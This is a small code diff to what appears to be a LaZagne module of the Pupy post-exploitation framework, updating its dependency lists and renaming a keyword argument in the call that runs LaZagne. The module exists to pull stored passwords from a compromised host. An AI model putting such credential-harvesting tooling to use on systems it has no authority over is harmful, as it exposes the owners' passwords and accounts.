@@ -17,8 +17,8 @@ class LaZagne(PupyModule):
     dependencies = {
         'all': [
             'whole', 'sqlite3', 'xml', 'calendar',
-            'memorpy', 'ConfigParser', 'Crypto.Util.asn1',
-            'Crypto.PublicKey', 'lazagne', 'laZagne'
+            'memorpy', 'ConfigParser', 'construct',
+            'lazagne', 'laZagne', 'pyasn1'
         ],
         'linux': [
             'secretstorage', 'crypt'
@@ -73,7 +73,7 @@ class LaZagne(PupyModule):
 
         results = obtain(whole(
             runLaZagne,
-            category_choosed=args.category, raise_on_exception=False))
+            category_selected=args.category, raise_on_exception=False))
 
         for r in results:
             if r[0] == 'User':
